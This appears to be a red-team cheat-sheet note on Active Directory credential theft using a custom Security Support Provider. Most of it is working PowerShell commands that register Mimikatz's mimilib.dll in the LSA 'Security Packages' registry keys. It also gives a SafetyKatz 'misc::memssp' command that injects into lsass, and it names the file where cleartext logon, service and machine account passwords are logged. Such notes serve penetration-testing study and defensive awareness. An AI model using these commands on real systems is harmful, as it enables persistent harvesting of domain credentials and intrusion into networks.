# Custom SSP 

Tags: #AD #Windows #Powershell #SafetyKatz 

```bash 
A Security Support Provider (SSP) is a DLL which provides ways for an application to obtain an authenticated connection. Some SSP Packages by Microsoft are

	- NTLM
	- Kerberos
	- Wdigest
	- CredSSP

Mimikatz provides a custom SSP - mimilib.dll. This SSP logs local logons, service account and machine account passwords in clear text on the target server.
```

```powershell 
We can use either of the ways:

# Drop the mimilib.dll to system32 and add mimilib to HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages:
❯ $packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages'| select -ExpandProperty 'Security Packages'
❯ $packages += "mimilib"
❯ Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages
❯ Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -Value $packages

# Using mimikatz, inject into lsass (Not super stable with Server 2019 and Server 2022 but still usable):
❯ SafetyKatz.exe -Command '"misc::memssp"'

Notes:
	1. All local logons on the DC are logged to 'cat C:\Windows\system32\mimilsa.log'
```